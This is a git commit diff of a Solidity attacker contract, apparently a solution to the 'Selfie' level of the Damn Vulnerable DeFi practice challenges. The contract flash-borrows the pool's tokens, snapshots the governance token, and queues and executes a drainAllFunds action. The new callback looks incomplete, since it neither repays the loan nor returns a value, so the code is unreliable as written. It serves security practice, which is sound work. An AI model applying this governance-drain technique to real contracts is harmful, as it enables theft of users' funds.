4116f3b98ff3b6bd017fcb10c3277f851a0b87e1
Crys <mariano.christopher123@gmail.com>
2023-05-09 12:44:58 +0800

    added probable solution

--- contracts/attacker-contracts/SelfieHack.sol
+++ contracts/attacker-contracts/SelfieHack.sol
@@ -1,42 +1,66 @@
-// // SPDX-License-Identifier: MIT
-// pragma solidity ^0.8.0;
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 
-// import "../DamnValuableTokenSnapshot.sol";
-// import "../selfie/SelfiePool.sol";
-// import "../selfie/SimpleGovernance.sol";
+import "../DamnValuableTokenSnapshot.sol";
+import "../selfie/SelfiePool.sol";
+import "../selfie/SimpleGovernance.sol";
 
-// contract AttackSelfie {
-//     DamnValuableTokenSnapshot public token;
-//     SelfiePool public pool;
-//     SimpleGovernance public governance;
+contract SelfieHack {
+    DamnValuableTokenSnapshot public token;
+    SelfiePool public pool;
+    SimpleGovernance public governance;
 
-//     uint256 public actionId;
+    uint256 public actionId;
 
-//     constructor(address _token, address _pool, address _governance) {
-//         token = DamnValuableTokenSnapshot(_token);
-//         pool = SelfiePool(_pool);
-//         governance = SimpleGovernance(_governance);
-//     }
+    constructor(address _token, address _pool, address _governance) {
+        token = DamnValuableTokenSnapshot(_token);
+        pool = SelfiePool(_pool);
+        governance = SimpleGovernance(_governance);
+    }
 
-//     fallback() external {
-//         token.snapshot();
-//         token.transfer(address(pool), token.balanceOf(address(this)));
-//     }
+    fallback() external {
+        token.snapshot();
+        token.transfer(address(pool), token.balanceOf(address(this)));
+    }
 
-//     function attack() external {
-//         pool.flashLoan(token.balanceOf(address(pool)));
-//         // This will run after the snapshot
-//         actionId = governance.queueAction(
-//             address(pool),
-//             abi.encodeWithSignature(
-//                 "drainAllFunds(address)",
-//                 address(msg.sender)
-//             ),
-//             0
-//         );
-//     }
+    function onFlashLoan(
+        address _initiator,
+        address _token,
+        uint256 _amount,
+        uint256 _fee,
+        bytes calldata _data
+    ) external returns (bytes32) {
+        // pool.flashLoan(IERC3156FlashBorrower(_initiator), _token, _amount, _data);
 
-//     function attack2() external {
-//         governance.executeAction(actionId);
-//     }
-// }
+        actionId = governance.queueAction(
+            address(pool),
+            0,
+            abi.encodeWithSignature(
+                "drainAllFunds(address)",
+                address(msg.sender)
+            )
+        );
+    }
+
+    function attack() external {
+        pool.flashLoan(
+            IERC3156FlashBorrower(address(this)),
+            address(token),
+            token.balanceOf(address(pool)),
+            bytes("0x")
+        );
+        // // This will run after the snapshot
+        // actionId = governance.queueAction(
+        //     address(pool),
+        //     0,
+        //     abi.encodeWithSignature(
+        //         "drainAllFunds(address)",
+        //         address(msg.sender)
+        //     )
+        // );
+    }
+
+    function attack2() external {
+        governance.executeAction(actionId);
+    }
+}
